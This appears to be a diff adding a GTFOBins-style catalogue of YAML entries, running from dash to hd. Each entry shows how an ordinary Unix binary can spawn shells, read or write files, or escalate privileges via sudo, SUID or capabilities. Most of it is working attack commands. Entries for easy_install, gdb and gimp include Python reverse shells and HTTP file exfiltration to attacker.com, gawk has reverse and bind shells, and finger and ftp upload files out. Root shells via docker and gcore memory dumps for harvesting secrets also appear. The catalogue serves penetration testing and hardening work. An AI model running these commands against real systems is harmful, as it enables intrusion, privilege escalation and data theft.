+sudo cut -d "" -f1 "$LFILE"
+---
+functions:
+shell:
+- code: dash
+file-write:
+- code: |
+export LFILE=file_to_write
+dash -c 'echo DATA > $LFILE'
+suid:
+- code: ./dash -p
+sudo:
+- code: sudo dash
+---
+description: |
+Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.
+
+This only works for the GNU variant of `date`.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+date -f $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./date -f $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo date -f $LFILE
+---
+functions:
+file-write:
+- code: |
+LFILE=file_to_write
+echo "DATA" | dd of=$LFILE
+file-read:
+- code: |
+LFILE=file_to_read
+dd if=$LFILE
+suid:
+- code: |
+LFILE=file_to_write
+echo "data" | ./dd of=$LFILE
+sudo:
+- code: |
+LFILE=file_to_write
+echo "data" | sudo dd of=$LFILE
+---
+description: The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+dialog --textbox "$LFILE" 0 0
+suid:
+- code: |
+LFILE=file_to_read
+./dialog --textbox "$LFILE" 0 0
+sudo:
+- code: |
+LFILE=file_to_read
+sudo dialog --textbox "$LFILE" 0 0
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+diff --line-format=%L /dev/null $LFILE
+- description: This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.
+code: |
+LFOLDER=folder_to_list
+TF=$(mktemp -d)
+diff --recursive $TF $LFOLDER
+suid:
+- code: |
+LFILE=file_to_read
+./diff --line-format=%L /dev/null $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo diff --line-format=%L /dev/null $LFILE
+---
+description: Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+dig -f $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo dig -f $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./dig -f $LFILE
+---
+functions:
+file-read:
+- description: This is not suitable for binary files.
+code: |
+LFILE=file_to_read
+dmesg -rF "$LFILE"
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+dmesg -H
+!/bin/sh
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo dmesg -H
+!/bin/sh
+---
+functions:
+sudo:
+- description: |
+It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
+Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.
+
+- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.
+
+- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.
+
+```
+make dmiwrite
+TF=$(mktemp)
+echo "DATA" > $TF
+./dmiwrite $TF x.dmi
+```
+code: |
+LFILE=file_to_write
+sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"
+---
+functions:
+sudo:
+- code: |
+sudo dmsetup create base <<EOF
+0 3534848 linear /dev/loop0 94208
+EOF
+sudo dmsetup ls --exec '/bin/sh -s'
+suid:
+- code: |
+./dmsetup create base <<EOF
+0 3534848 linear /dev/loop0 94208
+EOF
+./dmsetup ls --exec '/bin/sh -p -s'
+---
+functions:
+sudo:
+- description: |
+It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+```
+code: |
+sudo dnf install -y x-1.0-1.noarch.rpm
+---
+description: |
+This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.
+
+Any other Docker Linux image should work, e.g., `debian`.
+functions:
+shell:
+- description: The resulting is a root shell.
+code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+file-write:
+- description: Write a file by copying it to a temporary container and back to the target destination on the host.
+code: |
+CONTAINER_ID="$(docker run -d alpine)" # or existing
+TF=$(mktemp)
+echo "DATA" > $TF
+docker cp $TF $CONTAINER_ID:$TF
+docker cp $CONTAINER_ID:$TF file_to_write
+file-read:
+- description: Read a file by copying it to a temporary container and back to a new location on the host.
+code: |
+CONTAINER_ID="$(docker run -d alpine)" # or existing
+TF=$(mktemp)
+docker cp file_to_read $CONTAINER_ID:$TF
+docker cp $CONTAINER_ID:$TF $TF
+cat $TF
+sudo:
+- description: The resulting is a root shell.
+code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+suid:
+- description: The resulting is a root shell.
+code: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+---
+description: Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.
+functions:
+file-read:
+- description: The file content will be displayed in the DOSBox graphical window.
+code: |
+LFILE='\path	oile_to_read'
+dosbox -c 'mount c /' -c "type c:$LFILE"
+- description: The file is copied to a readable location.
+code: |
+LFILE='\path	oile_to_read'
+dosbox -c 'mount c /' -c "copy c:$LFILE c:	mp\output" -c exit
+cat '/tmp/OUTPUT'
+file-write:
+- description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`
+`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
+code: |
+LFILE='\path	oile_to_write'
+dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+suid:
+- description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`
+`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
+code: |
+LFILE='\path	oile_to_write'
+./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+sudo:
+- description: Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`
+`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.
+code: |
+LFILE='\path	oile_to_write'
+sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
+---
+functions:
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+dpkg -l
+!/bin/sh
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo dpkg -l
+!/bin/sh
+- description: |
+It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
+```
+TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
+```
+code: sudo dpkg -i x_1.0_all.deb
+---
+description: The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.
+functions:
+shell:
+- code: |
+tex '\special{psfile="`/bin/sh 1>&0"}nd'
+dvips -R0 texput.dvi
+sudo:
+- code: |
+tex '\special{psfile="`/bin/sh 1>&0"}nd'
+sudo dvips -R0 texput.dvi
+limited-suid:
+- code: |
+tex '\special{psfile="`/bin/sh 1>&0"}nd'
+./dvips -R0 texput.dvi
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+easy_install $TF
+reverse-shell:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+TF=$(mktemp -d)
+echo 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")' > $TF/setup.py
+easy_install $TF
+file-upload:
+- description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+TF=$(mktemp -d)
+echo 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
+easy_install $TF
+- description: Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+TF=$(mktemp -d)
+echo 'import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
+easy_install $TF
+file-download:
+- description: Fetch a remote file via HTTP GET request. The file path must be absolute.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=/tmp/file_to_save
+TF=$(mktemp -d)
+echo "import os;
+os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
+pip install $TF
+file-write:
+- description: The file path must be absolute.
+code: |
+export LFILE=/tmp/file_to_save
+TF=$(mktemp -d)
+echo "import os;
+os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
+easy_install $TF
+file-read:
+- description: The read file content is wrapped within program messages.
+code: |
+TF=$(mktemp -d)
+echo 'print(open("file_to_read").read())' > $TF/setup.py
+easy_install $TF
+library-load:
+- code: |
+TF=$(mktemp -d)
+echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
+easy_install $TF
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo easy_install $TF
+---
+description: This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.
+functions:
+shell:
+- code: |
+eb logs
+!/bin/sh
+sudo:
+- code: |
+sudo eb logs
+!/bin/sh
+---
+functions:
+shell:
+- code: |
+ed
+!/bin/sh
+file-write:
+- code: |
+ed file_to_write
+a
+DATA
+.
+w
+q
+file-read:
+- code: |
+ed file_to_read
+,p
+q
+suid:
+- code: |
+./ed file_to_read
+,p
+q
+sudo:
+- code: |
+sudo ed
+!/bin/sh
+limited-suid:
+- code: |
+./ed
+!/bin/sh
+---
+description: The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.
+functions:
+suid:
+- code: |
+LFILE=file_to_read
+./efax -d "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo efax -d "$LFILE"
+---
+functions:
+shell:
+- code: emacs -Q -nw --eval '(term "/bin/sh")'
+file-write:
+- code: |
+emacs file_to_write
+DATA
+C-x C-s
+file-read:
+- code: emacs file_to_read
+suid:
+- code: ./emacs -Q -nw --eval '(term "/bin/sh -p")'
+sudo:
+- code: sudo emacs -Q -nw --eval '(term "/bin/sh")'
+---
+functions:
+shell:
+- code: env /bin/sh
+suid:
+- code: ./env /bin/sh -p
+sudo:
+- code: sudo env /bin/sh
+---
+description: The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+eqn "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./eqn "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo eqn "$LFILE"
+---
+functions:
+shell:
+- code: |
+ex
+!/bin/sh
+file-write:
+- code: |
+ex file_to_write
+a
+DATA
+.
+w
+q
+file-read:
+- code: |
+ex file_to_read
+,p
+q
+sudo:
+- code: |
+sudo ex
+!/bin/sh
+---
+description: |
+If the permissions allow it, files are moved (instead of copied) to the destination.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+OUTPUT=output_file
+exiftool -filename=$OUTPUT $LFILE
+cat $OUTPUT
+file-write:
+- code: |
+LFILE=file_to_write
+INPUT=input_file
+exiftool -filename=$LFILE $INPUT
+sudo:
+- code: |
+LFILE=file_to_write
+INPUT=input_file
+sudo exiftool -filename=$LFILE $INPUT
+---
+description: The read file content is corrupted by replacing tabs with spaces.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+expand "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./expand "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo expand "$LFILE"
+---
+functions:
+file-read:
+- description: The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.
+code: |
+LFILE=file_to_read
+expect $LFILE
+shell:
+- code: expect -c 'spawn /bin/sh;interact'
+suid:
+- code: ./expect -c 'spawn /bin/sh -p;interact'
+sudo:
+- code: sudo expect -c 'spawn /bin/sh;interact'
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp -d)
+echo 'exec("/bin/sh")' > $TF/x.rb
+FACTERLIB=$TF facter
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo 'exec("/bin/sh")' > $TF/x.rb
+sudo FACTERLIB=$TF facter
+---
+functions:
+file-read:
+- description: Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.
+code: |
+LFILE=file_to_read
+file -f $LFILE
+- description: |
+Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.
+
+If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.
+
+It can also be provided with a directory and will read each file in the directory.
+code: |
+LFILE=file_to_read
+file -m $LFILE
+suid:
+- description: Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.
+code: |
+LFILE=file_to_read
+./file -f $LFILE
+sudo:
+- description: Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.
+code: |
+LFILE=file_to_read
+sudo file -f $LFILE
+---
+functions:
+shell:
+- code: find . -exec /bin/sh \; -quit
+suid:
+- code: ./find . -exec /bin/sh -p \; -quit
+sudo:
+- code: sudo find . -exec /bin/sh \; -quit
+---
+description: |
+`finger` hangs waiting for the remote peer to close the socket.
+functions:
+file-upload:
+- description: Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.
+code: |
+RHOST=attacker.com
+LFILE=file_to_send
+finger "$(base64 $LFILE)@$RHOST"
+file-download:
+- description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | sudo nc -l -p 79` on the attacker box to send the file.
+code: |
+RHOST=attacker.com
+LFILE=file_to_save
+finger x@$RHOST | base64 -d > "$LFILE"
+---
+functions:
+shell:
+- code: fish
+suid:
+- code: ./fish
+sudo:
+- code: sudo fish
+---
+functions:
+shell:
+- code: flock -u / /bin/sh
+suid:
+- code: ./flock -u / /bin/sh -p
+sudo:
+- code: sudo flock -u / /bin/sh
+---
+description: The read file content is not binary-safe.
+functions:
+file-read:
+- description: This only works for the GNU version of `fmt`.
+code: |
+LFILE=file_to_read
+fmt -pNON_EXISTING_PREFIX "$LFILE"
+- description: This corrupts the output by wrapping very long lines at the given width.
+code: |
+LFILE=file_to_read
+fmt -999 "$LFILE"
+suid:
+- description: This corrupts the output by wrapping very long lines at the given width.
+code: |
+LFILE=file_to_read
+./fmt -999 "$LFILE"
+sudo:
+- description: This corrupts the output by wrapping very long lines at the given width.
+code: |
+LFILE=file_to_read
+sudo fmt -999 "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+fold -w99999999 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./fold -w99999999 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo fold -w99999999 "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+fping -f $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo fping -f $LFILE
+---
+functions:
+shell:
+- code: |
+ftp
+!/bin/sh
+file-upload:
+- description: Send local file to a FTP server.
+code: |
+RHOST=attacker.com
+ftp $RHOST
+put file_to_send
+file-download:
+- description: Fetch a remote file from a FTP server.
+code: |
+RHOST=attacker.com
+ftp $RHOST
+get file_to_get
+sudo:
+- code: |
+sudo ftp
+!/bin/sh
+---
+functions:
+shell:
+- code: gawk 'BEGIN {system("/bin/sh")}'
+non-interactive-reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+s = "/inet/tcp/0/" RHOST "/" RPORT;
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+code: |
+LPORT=12345
+gawk -v LPORT=$LPORT 'BEGIN {
+s = "/inet/tcp/" LPORT "/0/0";
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+file-write:
+- code: |
+LFILE=file_to_write
+gawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
+file-read:
+- code: |
+LFILE=file_to_read
+gawk '//' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./gawk '//' "$LFILE"
+sudo:
+- code: sudo gawk 'BEGIN {system("/bin/sh")}'
+limited-suid:
+- code: ./gawk 'BEGIN {system("/bin/sh")}'
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+gcc -x c -E "$LFILE"
+file-write: # XXX this should be file-delete
+- code: |
+LFILE=file_to_delete
+gcc -xc /dev/null -o $LFILE
+shell:
+- code: gcc -wrapper /bin/sh,-s .
+sudo:
+- code: sudo gcc -wrapper /bin/sh,-s .
+---
+description: It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.
+functions:
+file-read:
+- code: gcore $PID
+sudo:
+- code: sudo gcore $PID
+suid:
+- code: ./gcore $PID
+---
+functions:
+shell:
+- code: gdb -nx -ex '!sh' -ex quit
+reverse-shell:
+- description: This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")' -ex quit
+file-upload:
+- description: This requires that GDB is compiled with Python support. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+gdb -nx -ex 'python import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
+- description: This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+gdb -nx -ex 'python import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
+file-download:
+- description: This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+gdb -nx -ex 'python import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
+file-write:
+- description: This requires that GDB is compiled with Python support.
+code: |
+LFILE=file_to_write
+gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
+file-read:
+- description: This requires that GDB is compiled with Python support.
+code: gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit
+library-load:
+- description: This requires that GDB is compiled with Python support.
+code: gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
+suid:
+- description: This requires that GDB is compiled with Python support.
+code: ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+sudo:
+- code: sudo gdb -nx -ex '!sh' -ex quit
+capabilities:
+- description: This requires that GDB is compiled with Python support.
+code: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+---
+functions:
+shell:
+- description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
+code: gem open -e "/bin/sh -c /bin/sh" rdoc
+- description: This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed).
+code: |
+gem open rdoc
+:!/bin/sh
+- description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
+code: |
+TF=$(mktemp -d)
+echo 'system("/bin/sh")' > $TF/x
+gem build $TF/x
+- description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
+code: |
+TF=$(mktemp -d)
+echo 'system("/bin/sh")' > $TF/x
+gem install --file $TF/x
+sudo:
+- description: This requires the name of an installed gem to be provided (`rdoc` is usually installed).
+code: sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+---
+functions:
+shell:
+- code: genie -c '/bin/sh'
+suid:
+- code: ./genie -c '/bin/sh'
+sudo:
+- code: sudo genie -c '/bin/sh'
+---
+description: The output is placed inside the ISO9660 file system binary format thus it may not be suitable for binary content as is, yet it can be mounted or extracted with tools like `7z`.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+genisoimage -q -o - "$LFILE"
+suid:
+- description: The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.
+code: |
+LFILE=file_to_read
+./genisoimage -sort "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo genisoimage -q -o - "$LFILE"
+---
+functions:
+shell:
+- code: ghc -e 'System.Process.callCommand "/bin/sh"'
+sudo:
+- code: sudo ghc -e 'System.Process.callCommand "/bin/sh"'
+---
+functions:
+shell:
+- code: |
+ghci
+System.Process.callCommand "/bin/sh"
+sudo:
+- code: |
+sudo ghci
+System.Process.callCommand "/bin/sh"
+---
+description: The binary hangs after executing the Python code and can be terminated pressing ``ctrl-c``.
+functions:
+shell:
+- code: gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
+reverse-shell:
+- description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+pty.spawn("/bin/sh")'
+file-upload:
+- description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export URL=http://attacker.com/
+export LFILE=file_to_send
+gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
+else: import urllib as u, urllib2 as r
+r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))'
+- description: Serve files in the local folder running an HTTP server.
+code: |
+export LPORT=8888
+gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
+if sys.version_info.major == 3: import http.server as s, socketserver as ss
+else: import SimpleHTTPServer as s, SocketServer as ss
+ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export URL=http://attacker.com/file_to_get
+export LFILE=file_to_save
+gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
+if sys.version_info.major == 3: import urllib.request as r
+else: import urllib as r
+r.urlretrieve(e["URL"], e["LFILE"])'
+file-write:
+- code: |
+gimp -idf --batch-interpreter=python-fu-eval -b 'open("file_to_write", "wb").write("DATA")'
+file-read:
+- code: gimp -idf --batch-interpreter=python-fu-eval -b 'print(open("file_to_read").read())'
+library-load:
+- code: gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary("lib.so")'
+suid:
+- code: ./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
+sudo:
+- code: sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
+---
+functions:
+shell:
+- code: |
+ginsh
+!/bin/sh
+limited-suid:
+- code: |
+./ginsh
+!/bin/sh
+sudo:
+- code: |
+sudo ginsh
+!/bin/sh
+---
+functions:
+shell:
+- code: PAGER='sh -c "exec sh 0<&1"' git -p help
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+git help config
+!/bin/sh
+- description: The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+git branch --help config
+!/bin/sh
+- description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
+code: |
+TF=$(mktemp -d)
+git init "$TF"
+echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+git -C "$TF" commit --allow-empty -m x
+- code: |
+TF=$(mktemp -d)
+ln -s /bin/sh "$TF/git-x"
+git "--exec-path=$TF" x
+file-read:
+- description: The read file content is displayed in `diff` style output format.
+code: |
+LFILE=file_to_read
+git diff /dev/null $LFILE
+sudo:
+- code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo git -p help config
+!/bin/sh
+- description: The help system can also be reached from any `git` command, e.g., `git branch`. This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo git branch --help config
+!/bin/sh
+- description: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the `-C` option.
+code: |
+TF=$(mktemp -d)
+git init "$TF"
+echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
+mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
+sudo git -C "$TF" commit --allow-empty -m x
+- code: |
+TF=$(mktemp -d)
+ln -s /bin/sh "$TF/git-x"
+sudo git "--exec-path=$TF" x
+limited-suid:
+- code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
+---
+functions:
+shell:
+- code: grc --pty /bin/sh
+sudo:
+- code: sudo grc --pty /bin/sh
+---
+description: |
+There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+grep '' $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./grep '' $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo grep '' $LFILE
+---
+functions:
+file-write:
+- description: Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).
+code: |
+LFILE=file_to_write
+gtester "DATA" -o $LFILE
+shell:
+- code: |
+TF=$(mktemp)
+echo '#!/bin/sh' > $TF
+echo 'exec /bin/sh -p 0<&1' >> $TF
+chmod +x $TF
+gtester -q $TF
+sudo:
+- code: |
+TF=$(mktemp)
+echo '#!/bin/sh' > $TF
+echo 'exec /bin/sh 0<&1' >> $TF
+chmod +x $TF
+sudo gtester -q $TF
+suid:
+- code: |
+TF=$(mktemp)
+echo '#!/bin/sh -p' > $TF
+echo 'exec /bin/sh -p 0<&1' >> $TF
+chmod +x $TF
+sudo gtester -q $TF
+---
+description: There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+gzip -f $LFILE -t
+- code: |
+LFILE=file_to_read
+gzip -c $LFILE | gzip -d
+suid:
+- code: |
+LFILE=file_to_read
+./gzip -f $LFILE -t
+sudo:
+- code: |
+LFILE=file_to_read
+sudo gzip -f $LFILE -t
+---
+description: The output is actually an hex dump.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+hd "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./hd "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo hd "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+head -c1G "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./head -c1G "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo head -c1G "$LFILE"
+---
+description: The output is actually an hex dump.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
